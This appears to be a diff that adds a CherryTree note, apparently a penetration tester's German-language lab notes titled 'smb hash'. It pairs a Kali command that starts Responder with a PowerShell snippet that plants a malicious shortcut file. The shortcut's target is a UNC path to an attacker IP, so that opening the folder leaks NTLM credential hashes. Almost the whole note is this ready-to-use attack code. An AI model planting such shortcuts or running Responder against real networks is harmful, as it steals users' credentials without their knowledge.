@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="66" master_id="0" name="smb hash" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1749161563" ts_lastsave="1749161694">
+    <rich_text>Auf kali:
+responder -I eth0
+
+In Powershell upload:
+
+
+</rich_text>
+    <codebox char_offset="51" justification="left" frame_width="1971" frame_height="20" width_in_pixels="1" syntax_highlighting="python3" highlight_brackets="1" show_line_numbers="0">$objShell = New-Object -ComObject WScript.Shell&#13;
+$lnk = $objShell.CreateShortcut("C:\Malicious.lnk")&#13;
+$lnk.TargetPath = "\\10.10.0.94\@threat.png"&#13;
+$lnk.WindowStyle = 1&#13;
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"&#13;
+$lnk.Description = "Browsing to the dir this file lives in will &#13;
+perform an authentication request."&#13;
+$lnk.HotKey = "Ctrl+Alt+O"&#13;
+$lnk.Save()</codebox>
+    <encoded_png char_offset="54" justification="left" link="" sha256sum="30f71da65979906ab0f7afefc4e0914af115abed92d012ff054b92a1bfd07545"/>
+  </node>
+</cherrytree>
